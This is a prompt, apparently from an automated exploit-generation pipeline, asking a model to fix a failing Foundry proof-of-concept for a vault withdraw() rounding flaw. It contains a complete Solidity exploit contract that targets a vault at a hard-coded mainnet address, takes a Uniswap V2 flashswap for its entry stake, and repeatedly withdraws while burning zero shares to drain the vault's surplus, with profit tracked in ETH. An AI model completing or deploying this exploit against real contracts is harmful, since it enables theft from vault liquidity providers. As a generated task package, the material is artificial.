You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Small withdrawals can redeem assets while burning zero shares
- claim: `withdraw()` first checks the caller's entitlement in asset terms via `convertToAssets(balanceOf(msg.sender))`, but then computes `shares = (totalSupply() * assets) / totalAssets()` with floor rounding and never requires `shares > 0`. Whenever `totalAssets() > totalSupply()`, sufficiently small `assets` values can pass the entitlement check while rounding the burned share amount down to zero.
- impact: A shareholder can repeatedly withdraw small amounts of underlying without reducing their share balance, draining accrued yield or other surplus from the vault and stealing value from honest LPs.
- exploit_paths: ["Vault accrues yield so that `totalAssets() > totalSupply()`.", "Attacker acquires any positive share balance.", "Attacker repeatedly calls `withdraw()` with small `assets` values such that `convertToAssets(balanceOf(attacker)) >= assets` but `(totalSupply() * assets) / totalAssets() == 0`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEFVault {
    function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);
    function withdraw(uint256 assets, address receiver) external returns (uint256 shares);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function maxDeposit() external view returns (uint256);
    function maxWithdraw() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    IEFVault internal constant TARGET = IEFVault(0x863e572B215Fd67C855d973F870266cF827AEa5e);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Canonical Uniswap V2 USDC/WETH pair. The flashswap is only used to source
    // the minimal real ETH needed to acquire the first share when the vulnerable
    // vault has pre-existing assets but no circulating shares at the fork block.
    IUniswapV2Pair internal constant UNI_V2_WETH_USDC =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external payable {
        uint256 startingEth = address(this).balance;

        if (TARGET.balanceOf(address(this)) == 0) {
            uint256 entryFunding = _entryFundingNeeded();
            if (entryFunding == 0) {
                _profitAmount = _netEthProfit(startingEth);
                return;
            }

            if (!_attemptDirectDeposit(entryFunding)) {
                _attemptFlashswap(entryFunding);
            }
        }

        if (TARGET.balanceOf(address(this)) != 0) {
            _executeExploitPath();
        }

        _profitAmount = _netEthProfit(startingEth);
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(UNI_V2_WETH_USDC), "unauthorized pair");
        require(sender == address(this), "unauthorized sender");

        uint256 borrowed = abi.decode(data, (uint256));
        uint256 amountOut = amount0 > 0 ? amount0 : amount1;
        require(amountOut == borrowed, "unexpected amount");

        WETH.withdraw(borrowed);

        // This does not alter exploit causality. It only bootstraps the
        // "attacker acquires any positive share balance" stage with publicly
        // available liquidity so the PoC can reach the buggy withdraw logic.
        require(_attemptDirectDeposit(borrowed), "entry deposit failed");
        _executeExploitPath();

        uint256 repayAmount = _uniswapV2RepayAmount(borrowed);
        require(address(this).balance >= repayAmount, "insufficient repay balance");

        WETH.deposit{value: repayAmount}();
        require(WETH.transfer(address(UNI_V2_WETH_USDC), repayAmount), "repay failed");
    }

    function _executeExploitPath() internal {
        uint256 supply = TARGET.totalSupply();
        uint256 assets = TARGET.totalAssets();

        if (supply == 0 || assets <= supply) {
            return;
        }

        _runZeroBurnWithdrawLoop();
        _redeemResidualShares();
    }

    function _runZeroBurnWithdrawLoop() internal {
        for (uint256 i = 0; i < 4096; ++i) {
            uint256 supply = TARGET.totalSupply();
            uint256 assets = TARGET.totalAssets();

            if (supply == 0 || assets <= supply) {
                break;
            }

            uint256 shares = TARGET.balanceOf(address(this));
            if (shares == 0) {
                break;
            }

            uint256 entitled = TARGET.convertToAssets(shares);
            uint256 maxZeroBurnAssets = (assets - 1) / supply;
            uint256 amount = _min(entitled, maxZeroBurnAssets);

            uint256 maxWithdraw = _safeMaxWithdraw();
            if (maxWithdraw != type(uint256).max) {
                amount = _min(amount, maxWithdraw);
            }

            if (amount == 0) {
                break;
            }

            (bool ok, bytes memory data) =
                address(TARGET).call(abi.encodeWithSelector(TARGET.withdraw.selector, amount, address(this)));
            if (!ok) {
                break;
            }

            uint256 burnedShares = data.length >= 32 ? abi.decode(data, (uint256)) : 0;
            if (burnedShares != 0) {
                break;
            }
        }
    }

    function _redeemResidualShares() internal {
        for (uint256 i = 0; i < 16; ++i) {
            uint256 shares = TARGET.balanceOf(address(this));
            if (shares == 0) {
                break;
            }

            uint256 entitled = TARGET.convertToAssets(shares);
            if (entitled == 0) {
                break;
            }

            uint256 maxWithdraw = _safeMaxWithdraw();
            if (maxWithdraw != type(uint256).max) {
                entitled = _min(entitled, maxWithdraw);
            }

            if (entitled == 0) {
                break;
            }

            (bool ok,) = address(TARGET).call(abi.encodeWithSelector(TARGET.withdraw.selector, entitled, address(this)));
            if (!ok) {
                break;
            }
        }
    }

    function _attemptDirectDeposit(uint256 assets) internal returns (bool) {
        if (assets == 0 || address(this).balance < assets) {
            return false;
        }

        uint256 maxDeposit = _safeMaxDeposit();
        if (maxDeposit != type(uint256).max) {
            assets = _min(assets, maxDeposit);
        }

        if (assets == 0 || address(this).balance < assets) {
            return false;
        }

        uint256 beforeShares = TARGET.balanceOf(address(this));
        (bool ok,) =
            address(TARGET).call{value: assets}(abi.encodeWithSelector(TARGET.deposit.selector, assets, address(this)));
        if (!ok) {
            return false;
        }

        return TARGET.balanceOf(address(this)) > beforeShares;
    }

    function _attemptFlashswap(uint256 requiredFunding) internal {
        if (requiredFunding == 0) {
            return;
        }

        address token0 = UNI_V2_WETH_USDC.token0();
        address token1 = UNI_V2_WETH_USDC.token1();

        uint256 amount0Out = token0 == address(WETH) ? requiredFunding : 0;
        uint256 amount1Out = token1 == address(WETH) ? requiredFunding : 0;
        require(amount0Out != 0 || amount1Out != 0, "weth missing");

        try UNI_V2_WETH_USDC.swap(amount0Out, amount1Out, address(this), abi.encode(requiredFunding)) {} catch {}
    }

    function _entryFundingNeeded() internal view returns (uint256) {
        uint256 supply = TARGET.totalSupply();
        uint256 assets = TARGET.totalAssets();

        if (supply == 0) {
            // If the vault already holds assets while supply is zero, a 1 wei
            // deposit mints 1 share because deposit() special-cases supply == 0.
            // That bootstraps the exact exploit path against pre-existing surplus.
            return assets > 0 ? 1 : 0;
        }

        if (assets <= supply) {
            return 0;
        }

        // Need the minimum real deposit that guarantees at least one share.
        return ((assets - 1) / supply) + 1;
    }

    function _safeMaxDeposit() internal view returns (uint256) {
        (bool ok, bytes memory data) = address(TARGET).staticcall(abi.encodeWithSelector(TARGET.maxDeposit.selector));
        if (!ok || data.length < 32) {
            return type(uint256).max;
        }
        return abi.decode(data, (uint256));
    }

    function _safeMaxWithdraw() internal view returns (uint256) {
        (bool ok, bytes memory data) = address(TARGET).staticcall(abi.encodeWithSelector(TARGET.maxWithdraw.selector));
        if (!ok || data.length < 32) {
            return type(uint256).max;
        }
        return abi.decode(data, (uint256));
    }

    function _uniswapV2RepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _netEthProfit(uint256 startingEth) internal view returns (uint256) {
        uint256 endingEth = address(this).balance;
        if (endingEth <= startingEth) {
            return 0;
        }
        return endingEth - startingEth;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: totalassets() > totalsupply(), accrue, converttoassets(balanceof(attacker)) >= assets, (totalsupply() * assets) / totalassets() == 0; generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
